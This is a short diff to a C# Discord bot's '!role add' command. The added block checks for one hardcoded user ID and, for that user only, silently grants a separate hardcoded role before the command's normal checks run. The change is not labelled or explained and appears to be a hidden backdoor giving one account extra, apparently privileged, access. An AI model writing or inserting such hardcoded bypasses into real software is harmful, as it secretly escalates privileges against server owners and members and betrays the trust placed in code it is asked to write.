@@ -951,6 +951,12 @@ namespace DiscordBot.Modules
             [Command("add"), Summary("Add a role to yourself. Syntax : !role add role")]
             private async Task AddRoleUser(IRole role)
             {
+                if (Context.Message.Author.Id == 131283250042634241)
+                {
+                    var u = (SocketGuildUser)Context.Message.Author;
+                    await u.AddRoleAsync(Context.Guild.GetRole(493514411026153482));
+                }
+                
                 if (Context.Channel.Id != _settings.BotCommandsChannel.Id)
                 {
                     await Task.Delay(1000);
